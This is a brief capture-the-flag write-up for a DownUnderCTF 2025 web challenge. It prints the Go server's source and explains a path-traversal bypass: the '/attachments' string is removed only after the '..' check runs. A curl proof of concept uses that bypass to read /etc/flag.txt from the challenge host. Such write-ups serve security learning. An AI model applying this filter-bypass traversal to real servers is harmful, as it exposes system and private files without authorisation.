---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/down-under/secure-email-attachments/","tags":["web","downunder_ctf_25"]}
---

this is the app src:
```go
package main

import (
    "net/http"
    "path/filepath"
    "strings"

    "github.com/gin-gonic/gin"
)

func main() {
    r := gin.Default()

    r.GET("/*path", func(c *gin.Context) {
        p := c.Param("path")
        if strings.Contains(p, "..") {
            c.AbortWithStatus(400)
            c.String(400, "URL path cannot contain \"..\"")
            return
        }
        // Some people were confused and were putting /attachments in the URLs. This fixes that
        cleanPath := filepath.Join("./attachments", filepath.Clean(strings.ReplaceAll(p, "/attachments", "")))
        http.ServeFile(c.Writer, c.Request, cleanPath)
    })

    r.Run("0.0.0.0:1337")
}
```

the goal is directory traversal to `/etc/flag.txt`

it throws a 400 if it detects `..` and it replaces `/attachments` with "".

so `/attachments./attachments./` ==>> `../`


> [!bug]+ poc
> something like this does the trick:
> 
> ```sh
> curl http://chal.2025-us.ductf.net:30014/attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments./attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//attachments./attachments.//etc/flag.txt
> ```


